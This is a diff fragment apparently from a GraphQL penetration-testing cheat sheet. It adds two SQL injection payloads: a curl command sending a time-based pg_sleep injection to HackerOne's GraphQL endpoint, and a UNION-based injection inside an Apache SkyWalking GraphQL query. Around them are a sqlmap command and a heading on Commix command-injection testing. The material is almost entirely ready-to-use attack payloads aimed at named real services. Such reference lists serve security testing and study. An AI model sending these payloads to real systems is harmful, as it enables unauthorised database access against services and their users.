@@ -151,6 +151,21 @@ query {
         id
     }
 }
+
+HackerOne SQLi Payload 
+time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=
+1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
+
+Apache Skywalker SQLi Payload
+query SQLi($d: Duration!) {
+    getLinearIntValues(metric: {name: "all_p99", id: "') UNION SELECT 1,CONCAT('~','9999999999','~')--"}, duration: $d)
+    {
+        values {
+            value
+        }
+    }
+}
+
 sqlmap -r request.txt —dbms=sqlite —tables
 
 OS Command injection Automated Testing with Commix
